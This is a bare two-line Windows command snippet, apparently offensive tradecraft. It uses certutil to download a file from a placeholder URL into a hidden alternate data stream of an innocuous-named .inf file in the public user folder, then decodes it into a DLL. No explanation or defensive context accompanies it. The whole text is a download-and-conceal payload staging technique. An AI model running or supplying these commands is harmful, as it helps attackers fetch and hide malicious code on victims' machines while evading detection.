certutil -urlcache -split -f http://URL-TO-DLL C:\Users\Public\sysinfo.inf:enc.b64
certutil -decode C:\Users\Public\sysinfo.inf:enc.b64 C:\Users\Public\dec.dll
